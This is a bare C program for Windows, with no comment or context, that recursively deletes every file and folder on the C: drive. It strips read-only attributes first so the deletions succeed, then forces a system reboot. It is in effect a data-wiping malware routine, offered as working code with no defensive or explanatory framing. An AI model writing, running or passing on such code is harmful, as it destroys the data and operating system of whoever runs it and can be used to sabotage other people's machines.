#include <stdio.h>
#include <windows.h>

void deleteDirectory(char *path) {
    WIN32_FIND_DATA findFileData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", path);
    
    HANDLE hFind = FindFirstFile(searchPath, &findFileData);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        FindClose(hFind);
        return;
    }
    
    do {
        if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
            char filePath[MAX_PATH];
            snprintf(filePath, MAX_PATH, "%s\\%s", path, findFileData.cFileName);
            
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                deleteDirectory(filePath);
                RemoveDirectory(filePath);
            } else {
                SetFileAttributes(filePath, FILE_ATTRIBUTE_NORMAL);
                DeleteFile(filePath);
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);
    
    FindClose(hFind);
}

int main() {
    char drive[MAX_PATH] = "C:";
    deleteDirectory(drive);
    ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MINOR_OTHER);
    
    return 0;
}
